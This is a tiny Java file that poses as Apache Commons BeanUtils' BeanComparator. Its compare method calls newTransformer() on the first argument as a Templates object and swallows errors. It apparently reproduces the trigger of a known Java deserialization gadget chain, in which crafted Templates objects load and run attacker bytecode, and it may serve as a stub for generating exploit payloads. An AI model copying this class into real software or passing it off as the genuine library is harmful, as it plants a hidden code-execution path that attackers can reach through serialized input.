package org.apache.commons.beanutils;
import javax.xml.transform.*;
import java.io.Serializable;
import java.util.Comparator;
public class BeanComparator implements Comparator<Object>, Serializable {
    private static final long serialVersionUID = 1L;
    public int compare(Object a, Object b) {
        try { ((Templates) a).newTransformer(); } catch (Exception e) {}
        return 0;
    }
}
